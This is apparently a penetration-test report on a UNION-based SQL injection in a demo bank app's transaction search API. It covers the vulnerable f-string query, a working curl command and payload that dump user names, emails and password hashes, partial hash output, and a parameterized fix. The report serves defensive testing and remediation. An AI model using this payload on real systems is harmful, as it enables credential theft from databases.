# PT-02: SQL Injection (UNION-based) — Transaction Search API

## Severity
**Critical** (CVSS 3.1: 9.8 — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)

## CWE
CWE-89: Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)

## OWASP Category
A03:2021 — Injection

## Affected Endpoint
`POST /api/search-transactions`

## Affected Functionality
Transaction search — lets a logged-in user filter their own transaction history by a free-text description keyword (`q` parameter).

## Description
The `q` parameter is concatenated directly into a raw SQL string using an f-string, with no parameterization or escaping:

```python
# app/routes/api.py
search_term = request.form.get('q', '')

query = f"""
    SELECT * FROM transactions
    WHERE user_id = {session['user_id']}
    AND description LIKE '%{search_term}%'
"""
result = db.session.execute(text(query))
```

Because `search_term` is embedded verbatim inside the SQL string, an attacker can close the `LIKE` clause and inject arbitrary SQL — including a `UNION SELECT` that pulls data from **any other table in the database**, not just `transactions`. The endpoint only requires the attacker to be logged in as *any* valid user (even the lowest-privileged one); it does not need to be an admin.

## Attack Scenario
1. Attacker registers a normal customer account (or uses any demo login).
2. Attacker sends a search request with a UNION payload instead of a real search term.
3. Because the query returns JSON built directly from the raw result rows, the injected `UNION SELECT` output is rendered back to the attacker as if it were transaction data.
4. Attacker pivots the injection to read the `users` table — extracting every customer's username, email, and password hash directly from the bank's database, from a single unauthenticated-for-that-data HTTP request.
5. Attacker takes the leaked hashes offline for cracking, or uses leaked emails/usernames for targeted phishing.

## Steps to Reproduce
1. Log in as `alice` / `password123`.
2. Confirm baseline functionality — send a normal search:
   ```bash
   curl -b alice_cookies.txt -X POST http://localhost:5000/api/search-transactions -d "q=Payment"
   ```
   Returns Alice's own "Payment for services" transaction — as expected.
3. Send the injection payload instead:
   ```bash
   curl -b alice_cookies.txt -X POST http://localhost:5000/api/search-transactions \
     --data-urlencode "q=' UNION SELECT id, username, email, 0, 0, password_hash, is_admin, full_name, created_at FROM users -- "
   ```
4. Observe the response contains rows that are clearly **not transactions** — they contain usernames, emails, and scrypt password hashes from the `users` table.

## Proof of Concept

**Payload (`q` parameter):**
```sql
' UNION SELECT id, username, email, 0, 0, password_hash, is_admin, full_name, created_at FROM users --
```

**Resulting query executed by the server:**
```sql
SELECT * FROM transactions
WHERE user_id = 1
AND description LIKE '%' UNION SELECT id, username, email, 0, 0, password_hash, is_admin, full_name, created_at FROM users -- %'
```

**Response (redacted — one real user account omitted for privacy, demo accounts shown):**
```json
{
  "transactions": [
    { "id": 1, "from_account_id": 1, "to_account_id": 2, "amount": 500.0, "description": "Payment for services" },

    { "id": 1, "from_account_id": "alice", "to_account_id": "alice@muradbank.local",
      "amount": 0, "description": "scrypt:32768:8:1$9hRckFAM75szSYTu$7069...bd1f34" },

    { "id": 2, "from_account_id": "bob", "to_account_id": "bob@muradbank.local",
      "amount": 0, "description": "scrypt:32768:8:1$G7HoQnBPVOF2WMDK$0bcc...4c550" },

    { "id": 3, "from_account_id": "admin", "to_account_id": "admin@muradbank.local",
      "amount": 0, "description": "scrypt:32768:8:1$Uo25XBzOYtVyNQcK$db76...118d374" }
  ]
}
```
The `description` field of each injected row contains the **full password hash** of every user in the database, including `admin`. The `from_account_id`/`to_account_id` fields (repurposed via UNION) leak username and email.

## Impact
- **Complete authentication database compromise**: every user's username, email, and password hash retrievable by any authenticated low-privilege user.
- **Admin account takeover risk**: the `admin` hash is included — if the admin's real-world password is weak or reused, offline cracking leads to full admin panel takeover (which itself grants further access — see broken-authorization findings).
- Because SQLite has no separate privilege model here, the same UNION technique could read **any** table in the database (accounts, beneficiaries, messages) simply by changing the column list and source table.
- **Critical** rather than merely High because no special privilege is required, exploitation is trivial (single HTTP request), and the blast radius is the entire user base's credentials.

## Root Cause
Raw SQL string built via Python f-string interpolation of user-controlled input, executed directly against the database with no parameter binding. The developer used SQLAlchemy's `text()` purely to satisfy the 2.0 API requirement, without realizing `text()` does **not** sanitize a string that was already concatenated with untrusted input — the injection had already happened before `text()` ever saw the string.

## Remediation
Use bound parameters — never string-interpolate user input into SQL, even inside `text()`:

```python
from sqlalchemy import text

@api_bp.route('/search-transactions', methods=['POST'])
def search_transactions():
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    search_term = request.form.get('q', '')

    query = text("""
        SELECT * FROM transactions
        WHERE user_id = :user_id
        AND description LIKE :search_pattern
    """)

    result = db.session.execute(query, {
        'user_id': session['user_id'],
        'search_pattern': f'%{search_term}%'
    })
    rows = result.fetchall()
    ...
```

Even better — since this project already uses the SQLAlchemy ORM elsewhere, prefer the ORM query builder over raw SQL entirely:

```python
transactions = db.session.scalars(
    select(Transaction)
    .filter(Transaction.user_id == session['user_id'])
    .filter(Transaction.description.ilike(f'%{search_term}%'))
).all()
```

The ORM automatically parameterizes all values, eliminating this class of bug without needing to remember to bind parameters manually.

## Security Recommendation
1. **Ban raw SQL string interpolation project-wide** — enforce via code review that all DB access uses either the ORM query builder or `text()` with bound `:param` placeholders, never an f-string/`.format()`/`%`-formatted query.
2. **Least privilege DB user**: even with parameterization, the application's DB credentials should not have access to tables it doesn't need (defense in depth against future bugs).
3. **Never return raw hash values in any API response**, even internally — this endpoint's bug was compounded by the fact that a successful injection could exfiltrate `password_hash` at all. Hashes should never leave the authentication module's boundary.
4. **Add a regression test** that sends a UNION-based payload to this endpoint and asserts the response is empty/error rather than containing `users` table data.
5. Consider running `sqlmap` in CI against non-production instances as a smoke test for this class of regression.

## Evidence / Screenshots
- `docs/reports/evidence/PT-02-sqli-baseline.png` — normal search request/response.
- `docs/reports/evidence/PT-02-sqli-union-dump.png` — UNION payload response showing leaked password hashes (redacted for this write-up; full unredacted evidence kept locally, not committed, per data-handling best practice).

---
**Status:** ✅ Confirmed & Reproduced | **Fixed in commit:** see `security: fix SQL injection in transaction search (PT-02)`
